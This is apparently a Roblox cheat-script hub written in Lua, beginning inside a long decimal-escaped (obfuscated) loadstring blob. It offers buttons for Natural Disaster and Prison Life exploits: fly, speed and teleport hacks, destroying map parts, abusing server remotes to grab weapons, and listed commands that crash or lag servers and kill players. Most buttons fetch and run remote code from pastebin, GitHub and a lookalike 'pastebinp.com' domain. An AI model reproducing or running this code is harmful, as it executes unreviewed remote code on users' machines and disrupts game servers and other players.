114\117\101\41\32\116\104\101\110\32\45\45\32\67\104\101\99\107\32\102\111\114\32\115\116\101\97\108\97\98\108\101\32\71\114\101\101\110\66\97\108\108\111\111\110\32\10\9\98\97\108\108\111\111\110\67\108\111\110\101\32\61\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\71\114\101\101\110\66\97\108\108\111\111\110\34\44\32\116\114\117\101\41\58\67\108\111\110\101\40\41\32\45\45\32\99\108\111\110\101\32\105\116\32\10\9\98\97\108\108\111\111\110\67\108\111\110\101\46\80\97\114\101\110\116\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\10\101\110\100\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\83\112\111\111\107\121\115\99\97\114\121\115\107\101\108\101\116\111\110\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\99\97\108\32\115\111\110\103\32\61\32\34\83\79\78\71\32\78\65\77\69\34\10\10\114\101\113\117\101\115\116\32\61\32\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\108\121\114\105\99\115\46\102\108\99\46\98\97\114\47\115\101\97\114\99\104\63\115\111\110\103\61\115\112\111\111\107\121\115\112\111\111\107\121\115\107\101\108\101\116\111\110\34\41\10\10\100\101\99\111\100\101\100\32\61\32\103\97\109\101\46\72\116\116\112\83\101\114\118\105\99\101\58\74\83\79\78\68\101\99\111\100\101\40\114\101\113\117\101\115\116\41\10\10\108\111\99\97\108\32\108\121\114\105\99\115\32\61\32\123\125\10\102\111\114\32\105\32\105\110\32\100\101\99\111\100\101\100\46\108\121\114\105\99\115\58\103\109\97\116\99\104\40\34\91\94\92\114\92\110\93\43\34\41\32\100\111\10\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\108\121\114\105\99\115\44\32\105\41\10\101\110\100\10\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\108\121\114\105\99\115\41\32\100\111\10\32\32\32\119\97\105\116\40\51\41\10\32\32\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101\34\41\46\68\101\102\97\117\108\116\67\104\97\116\83\121\115\116\101\109\67\104\97\116\69\118\101\110\116\115\46\83\97\121\77\101\115\115\97\103\101\82\101\113\117\101\115\116\58\70\105\114\101\83\101\114\118\101\114\40\118\44\32\34\65\108\108\34\41\10\101\110\100\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\82\97\105\110\98\111\119\32\40\110\111\116\32\70\101\41\32\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\9\119\104\105\108\101\32\116\114\117\101\32\100\111\10\32\10\9\9\103\97\109\101\46\76\105\103\104\116\105\110\103\46\65\109\98\105\101\110\116\32\61\32\67\111\108\111\114\51\46\110\101\119\40\109\97\116\104\46\114\97\110\100\111\109\40\41\44\32\109\97\116\104\46\114\97\110\100\111\109\40\41\44\32\109\97\116\104\46\114\97\110\100\111\109\40\41\41\10\9\9\119\97\105\116\40\46\50\53\41\10\32\10\9\101\110\100\10\101\110\100\41\10\10\84\97\98\50\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\83\112\97\119\110\34\44\32\34\73\109\32\80\97\116\114\105\99\107\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\67\70\114\97\109\101\46\110\101\119\40\49\48\54\44\32\52\54\44\32\51\41\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\82\101\109\111\118\101\32\70\97\108\108\32\100\97\109\97\103\101\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\70\97\108\108\68\97\109\97\103\101\83\99\114\105\112\116\58\68\101\115\116\114\111\121\40\41\10\101\110\100\41\10\10\84\97\98\50\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\76\111\98\98\121\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\67\70\114\97\109\101\46\110\101\119\40\45\50\57\48\44\32\49\55\56\44\32\51\55\57\41\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\82\101\109\111\118\101\32\77\97\112\115\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\83\116\114\117\99\116\117\114\101\58\68\101\115\116\114\111\121\40\41\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\82\101\109\111\118\101\32\83\99\114\101\101\110\32\69\102\102\101\99\116\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\87\101\97\116\104\101\114\77\97\99\104\105\110\101\58\68\101\115\116\114\111\121\40\41\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\84\112\116\111\111\108\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\109\111\117\115\101\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\58\71\101\116\77\111\117\115\101\40\41\10\116\111\111\108\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\111\111\108\34\41\10\116\111\111\108\46\82\101\113\117\105\114\101\115\72\97\110\100\108\101\32\61\32\102\97\108\115\101\10\116\111\111\108\46\78\97\109\101\32\61\32\34\84\80\32\84\79\79\76\34\10\116\111\111\108\46\65\99\116\105\118\97\116\101\100\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\108\111\99\97\108\32\112\111\115\32\61\32\109\111\117\115\101\46\72\105\116\43\86\101\99\116\111\114\51\46\110\101\119\40\48\44\50\46\53\44\48\41\10\112\111\115\32\61\32\67\70\114\97\109\101\46\110\101\119\40\112\111\115\46\88\44\112\111\115\46\89\44\112\111\115\46\90\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\112\111\115\10\101\110\100\41\10\116\111\111\108\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\87\97\108\107\83\112\101\101\100\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\53\48\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\74\117\109\112\112\111\119\101\114\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\74\117\109\112\80\111\119\101\114\32\61\32\49\53\48\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\84\101\120\116\66\111\120\40\34\67\117\115\116\111\109\32\87\115\112\101\101\100\34\44\32\34\78\117\109\98\101\114\34\44\32\102\117\110\99\116\105\111\110\40\116\120\116\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\116\120\116\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\84\101\120\116\66\111\120\40\34\67\117\115\116\111\109\32\72\106\117\109\112\34\44\32\34\78\117\109\98\101\114\34\44\32\102\117\110\99\116\105\111\110\40\116\120\116\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\74\117\109\112\80\111\119\101\114\32\61\32\116\120\116\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\73\110\102\32\106\117\109\112\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\98\67\57\55\101\65\121\82\34\44\32\116\114\117\101\41\41\40\41\10\101\110\100\41\10\10\84\97\98\51\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\82\101\109\111\118\101\32\70\111\103\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\70\111\103\69\110\100\32\61\32\49\48\48\48\48\48\10\9\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\65\116\109\111\115\112\104\101\114\101\34\41\32\116\104\101\110\10\9\9\9\118\58\68\101\115\116\114\111\121\40\41\10\9\9\101\110\100\10\9\101\110\100\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\70\108\121\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\45\45\65\82\67\69\85\83\32\88\32\70\76\89\32\86\50\32\83\67\82\73\80\84\32\66\89\32\109\101\95\111\122\111\110\101\89\84\10\108\111\97\100\115\116\114\105\110\103\40\34\92\49\48\56\92\49\49\49\92\57\55\92\49\48\48\92\49\49\53\92\49\49\54\92\49\49\52\92\49\48\53\92\49\49\48\92\49\48\51\92\52\48\92\49\48\51\92\57\55\92\49\48\57\92\49\48\49\92\53\56\92\55\50\92\49\49\54\92\49\49\54\92\49\49\50\92\55\49\92\49\48\49\92\49\49\54\92\52\48\92\52\48\92\51\57\92\49\48\52\92\49\49\54\92\49\49\54\92\49\49\50\92\49\49\53\92\53\56\92\52\55\92\52\55\92\49\48\51\92\49\48\53\92\49\49\53\92\49\49\54\92\52\54\92\49\48\51\92\49\48\53\92\49\49\54\92\49\48\52\92\49\49\55\92\57\56\92\49\49\55\92\49\49\53\92\49\48\49\92\49\49\52\92\57\57\92\49\49\49\92\49\49\48\92\49\49\54\92\49\48\49\92\49\49\48\92\49\49\54\92\52\54\92\57\57\92\49\49\49\92\49\48\57\92\52\55\92\49\48\57\92\49\48\49\92\49\49\49\92\49\50\50\92\49\49\49\92\49\49\48\92\49\48\49\92\56\57\92\56\52\92\52\55\92\57\56\92\49\48\50\92\52\56\92\53\49\92\53\53\92\49\48\48\92\49\48\50\92\49\48\50\92\53\55\92\49\48\50\92\52\56\92\57\55\92\53\53\92\52\56\92\52\56\92\52\57\92\53\53\92\53\49\92\52\56\92\53\50\92\49\48\48\92\49\48\48\92\49\48\48\92\53\52\92\53\53\92\49\48\50\92\49\48\48\92\57\57\92\49\48\48\92\53\49\92\53\53\92\52\56\92\52\55\92\49\49\52\92\57\55\92\49\49\57\92\52\55\92\49\48\49\92\52\57\92\53\50\92\49\48\49\92\53\53\92\53\50\92\49\48\50\92\53\50\92\53\48\92\53\51\92\57\56\92\52\56\92\53\52\92\52\56\92\49\48\48\92\49\48\50\92\53\51\92\53\48\92\53\49\92\53\49\92\53\50\92\53\49\92\57\57\92\49\48\50\92\53\49\92\52\56\92\57\56\92\53\53\92\53\54\92\53\53\92\52\56\92\53\53\92\53\50\92\49\48\49\92\57\56\92\53\49\92\57\57\92\53\51\92\49\48\48\92\53\48\92\52\55\92\57\55\92\49\49\52\92\57\57\92\49\48\49\92\49\49\55\92\49\49\53\92\51\55\92\53\48\92\53\51\92\53\48\92\52\56\92\49\50\48\92\51\55\92\53\48\92\53\51\92\53\48\92\52\56\92\49\48\50\92\49\48\56\92\49\50\49\92\51\55\92\53\48\92\53\51\92\53\48\92\52\56\92\53\48\92\51\55\92\53\48\92\53\51\92\53\48\92\52\56\92\49\49\49\92\57\56\92\49\48\50\92\49\48\56\92\49\49\55\92\57\57\92\57\55\92\49\49\54\92\49\49\49\92\49\49\52\92\51\57\92\52\49\92\52\52\92\49\49\54\92\49\49\52\92\49\49\55\92\49\48\49\92\52\49\92\52\49\92\52\48\92\52\49\92\49\48\92\49\48\34\41\40\41\10\101\110\100\41\10\10\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\83\111\117\110\100\34\44\32\34\63\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\99\97\108\32\100\117\114\97\116\105\111\110\32\61\32\56\32\45\45\32\105\110\116\101\103\101\114\32\111\110\108\121\44\32\110\111\32\100\101\99\105\109\97\108\115\10\10\10\10\105\102\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\83\111\117\110\100\83\101\114\118\105\99\101\34\41\46\82\101\115\112\101\99\116\70\105\108\116\101\114\105\110\103\69\110\97\98\108\101\100\32\116\104\101\110\32\114\101\116\117\114\110\32\101\110\100\10\10\108\111\99\97\108\32\115\111\117\110\100\115\32\61\32\123\125\10\10\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\119\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\32\32\32\32\105\102\32\118\58\73\115\65\40\34\83\111\117\110\100\34\41\32\97\110\100\32\118\46\80\97\114\101\110\116\46\78\97\109\101\32\126\61\32\34\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\34\32\116\104\101\110\10\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\115\111\117\110\100\115\44\118\41\10\32\32\32\32\101\110\100\10\101\110\100\10\10\10\108\111\99\97\108\32\99\111\110\32\61\32\119\111\114\107\115\112\97\99\101\46\68\101\115\99\101\110\100\97\110\116\65\100\100\101\100\58\67\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\118\41\10\32\32\32\32\105\102\32\118\58\73\115\65\40\34\83\111\117\110\100\34\41\32\97\110\100\32\118\46\80\97\114\101\110\116\46\78\97\109\101\32\126\61\32\34\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\34\32\116\104\101\110\10\32\32\32\32\32\32\32\32\116\97\98\108\101\46\105\110\115\101\114\116\40\115\111\117\110\100\115\44\118\41\10\32\32\32\32\101\110\100\10\101\110\100\41\10\119\97\105\116\40\46\49\41\10\108\111\99\97\108\32\115\116\97\114\116\32\61\32\109\97\116\104\46\102\108\111\111\114\40\116\105\99\107\40\41\41\10\114\101\112\101\97\116\10\32\32\32\32\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\115\111\117\110\100\115\41\32\100\111\10\32\32\32\32\32\32\32\32\118\58\80\108\97\121\40\41\10\32\32\32\32\32\32\32\32\118\46\84\105\109\101\80\111\115\105\116\105\111\110\32\61\32\109\97\116\104\46\114\97\110\100\111\109\40\48\44\118\46\84\105\109\101\76\101\110\103\116\104\32\42\32\49\48\48\48\41\47\49\48\48\48\10\32\32\32\32\32\32\32\32\116\97\115\107\46\119\97\105\116\40\41\10\32\32\32\32\101\110\100\10\117\110\116\105\108\32\109\97\116\104\46\102\108\111\111\114\40\116\105\99\107\40\41\41\32\61\61\32\115\116\97\114\116\32\43\32\100\117\114\97\116\105\111\110\10\99\111\110\58\68\105\115\99\111\110\110\101\99\116\40\41\10\10\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\115\111\117\110\100\115\41\32\100\111\10\32\32\32\32\118\58\83\116\111\112\40\41\10\101\110\100\10\101\110\100\41\32\10")()
end)

Section:NewButton("Natural Disaster Gui 5 ", "Cool", function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/TurkOyuncu99/7c75386107937fa006304efd24543ad4/raw/8d759dfcd95d39949c692735cfdf62baec0bf835/cafwetweg", true))()
end)






local Section = Tab:NewSection("Prison Life")
Section:NewButton("Prison Life 1 ", "", function()
loadstring(game:HttpGet("https://pastebin.com/raw/Wa3uidQr"))()
end)
Section:NewButton("Prison Life 2 ", "", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/H17S32/Tiger_Admin/main/Script'))()
end)
Section:NewButton("Prison Life 3 ", "", function()
loadstring(game:HttpGet("https://pastebin.com/raw/mHfK0Xk4", true))()
end)

Section:NewButton("Prison Life GUI 1 ", "New TeddHub", function()
setclipboard("https://discord.gg/pTSg34Jz3n")
print("copied the discord")
if game.PlaceId == 155615604 then
    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
             local Window = Library.CreateLib("Teddy hub", "Serpent")
            local Credits = Window:NewTab("Main")
            local CreditsSection = Credits:NewSection("Credits")
            CreditsSection:NewLabel("Scripts Made By: Teddy")
            CreditsSection:NewLabel("and thank to mdr to help me on it!)")


    local Tab = Window:NewTab("Ui")
    local UiSection = Tab:NewSection("Toggle")
    UiSection:NewKeybind("Toggle Ui", "this will hide the ui(does not inculde animation)", Enum.KeyCode.RightControl, function()
        Library:ToggleUI()
    end)

    local Tab = Window:NewTab("LocalPlayer")
    local LocalPlayerSection = Tab:NewSection("Movement")
   LocalPlayerSection:NewSlider("Walkspeed", "if you sprint, you have to adjust again", 500, 16, function(s) -- 500 (MaxValue) | 0 (MinValue)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
    end)
 LocalPlayerSection:NewSlider("JumpPower", "Turns you into a pogostick.", 500, 50, function(s) -- 500 (MaxValue) | 0 (MinValue)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
    end)                              
                                                                                                                                   
    
    local Tab = Window:NewTab("Combat")
    local CombatSection = Tab:NewSection("Combat")
    CombatSection:NewButton("Become a american!", "M4A1 Not inculded.", function()
                print("All Weapons Given!")
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver.M9.ITEMPICKUP)
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.single.Hammer.ITEMPICKUP)
                workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
        print(currentOption)
    end)
    CombatSection:NewButton("HitboxExpander", "Hitbox Ui", function()
        loadstring(game:HttpGet(("https://gameovers.net/Scripts/Free/HitboxExpander/main.lua"),true))()
    end)
            local Misc = Window:NewTab("Miscellaneous")
            local MiscSection = Misc:NewSection("Miscellaneous")
            MiscSection:NewButton("Remove all Doors", "Removes Every Door!", function()
                for i,d in pairs(game.Workspace.Doors:GetChildren()) do
                    if d.ClassName == "Model" then
                        d:Destroy()
                    end
                end
            end)
            MiscSection:NewButton("Remove All Fences", "All Fences Will Be Removed!", function()
                for i,l in pairs(game.Workspace["Prison_Fences"]:GetChildren()) do
                    if l.Name == "fence" then
                        l:Destroy()
                    end
                end
            end)
        
            MiscSection:NewButton("Remove All Gates", "All Fences Will Be Removed!", function()
                game.Workspace["Prison_Fences"]["Prison_Gate"]:Destroy()
                game.Workspace["Prison_Fences"]["gate"]:Destroy()
            end)
        
    
    local Tab = Window:NewTab("Admin")
    local AdminSection = Tab:NewSection("madness")
    AdminSection:NewButton("Septex", "Gives You Commands!", function()
                loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/PrisonLife'),true))()
            end)
            AdminSection:NewButton("PrisonBreaker V1.5", "Prisonbreaker GUI", function()
                loadstring(game:HttpGet(('https://pastebin.com/raw/QcNge4QY'),true))()
            end)
             AdminSection:NewButton("Inf Yield", "gives you more cmds", function()
                loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
            end)
            local AdminSection = Tab:NewSection("Septex Commands")
        AdminSection:NewLabel(":rank player - gives player commands")
            AdminSection:NewLabel(":kill player - kills player")
            AdminSection:NewLabel(":sa player - spam arrest player")
            AdminSection:NewLabel(":crim player - makes player criminal")
            AdminSection:NewLabel(":bring player - brings player")
            AdminSection:NewLabel(":goto player - makes you go to player")
            AdminSection:NewLabel(":void player - voids player")
            AdminSection:NewLabel(":key player - gives player keycard")
            AdminSection:NewLabel(":cuffs player - gives player handcuffs")
            AdminSection:NewLabel(":trap player - traps player")
            AdminSection:NewLabel(":yard player - brings player to yard")
            AdminSection:NewLabel(":base player - brings player to criminal base")
            AdminSection:NewLabel(":prison player - brings player to prison")
            AdminSection:NewLabel(":lk - loopkills player")
            AdminSection:NewLabel(":aura - gives player kill aura")
            AdminSection:NewLabel(":virus - makes anyone who touch player dies")
            AdminSection:NewLabel(":oof - kills everyone")
            AdminSection:NewLabel(":spike - lag spike")
            AdminSection:NewLabel(":bspike - big lag spike")
            AdminSection:NewLabel(":lag - lags the server")
            AdminSection:NewLabel(":crash - crashes the server")
            AdminSection:NewLabel(":tk player - teleport you to player and kills them")
            AdminSection:NewLabel(":ltk player - loops tpkill")
            AdminSection:NewLabel(":logs - prints all used cmds")
            local Tab = Window:NewTab("Troll")
            local TrollSection = Tab:NewSection("FLY")
            TrollSection:NewButton("Flycar (AirWav)", "superman but car", function()
                loadstring(game:HttpGet(('https://pastebin.com/raw/VLBwAgwT'),true))()
            end)
    
            local TrollSection = Tab:NewSection("Dances")
            TrollSection:NewButton("NullWare V3", "i went through links for you", function()
                loadstring(game:HttpGet(('https://pastebin.com/raw/jUxDxBsp'),true))()
            end)

    local Tab = Window:NewTab("Teleports")
    local TeleportsSection = Tab:NewSection("be even faster than flash")
    TeleportsSection:NewButton("Outside of prison", "Teleports You outside of the prison!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(451.6684265136719, 98.0399169921875, 2216.338134765625)
            end)
            TeleportsSection:NewButton("Prison Yard", "Teleports You to the Prison Yard", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(736.4671630859375, 97.99992370605469, 2517.583740234375)
            end)
            TeleportsSection:NewButton("Kitchen", "Teleports You to the Kitchen!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(906.641845703125, 99.98993682861328, 2237.67333984375)
            end)
            TeleportsSection:NewButton("Prison Cells", "Teleports You to the Prison Cells!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(919.5551147460938, 99.98998260498047, 2441.700927734375)
            end)
            TeleportsSection:NewButton("Surveilance Room", "Teleports You to the Surveilance Room!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(795.251953125, 99.98998260498047, 2327.720703125)
            end)
            TeleportsSection:NewButton("Break Room", "Teleports You to the Break Room!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(800.0896606445312, 99.98998260498047, 2266.71630859375)
            end)
            TeleportsSection:NewButton("Police Armory", "Teleports You to the Police Armory!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(837.2889404296875, 99.98998260498047, 2270.99658203125)
            end)
            TeleportsSection:NewButton("Police Room", "Teleports to to the Police Room", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(836.5386352539062, 99.98998260498047, 2320.604248046875)
            end)
            TeleportsSection:NewButton("Cafeteria", "Teleports you to the Cafeteria!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(918.994873046875, 99.98993682861328, 2325.73095703125)
            end)
            TeleportsSection:NewButton("Criminal Base Inside", "Teleports you to the Criminal Base Inside!", function()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-975.8451538085938, 109.32379150390625, 2053.11376953125)
    end)
    
    coroutine.wrap(UVUZD_fake_script)()
game.Player.LocalPlayer:kick("go to prison bro")

    else

end
end)


Section:NewButton("PrisonLife Admin 1 ",  "Gives you septex admin", function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/PrisonLife'),true))()
end)

Section:NewButton("PrisonLife gui 2 ",  "Gives you Op stuff lol", function()
loadstring(game:HttpGet("https://pastebin.com/raw/wMagw9Cn", true))()
end)

Section:NewButton("PrisonLife Admin 2 ", "New and op", function()
loadstring(game:HttpGet('https://pastebinp.com/raw/dt7JbaH5'))()
end)

Section:NewButton("PrisonLife gui 3 ", "Gui lol", function()
loadstring(game:HttpGet("https://pastebin.com/raw/dJ6tcE7h", true))()
end)
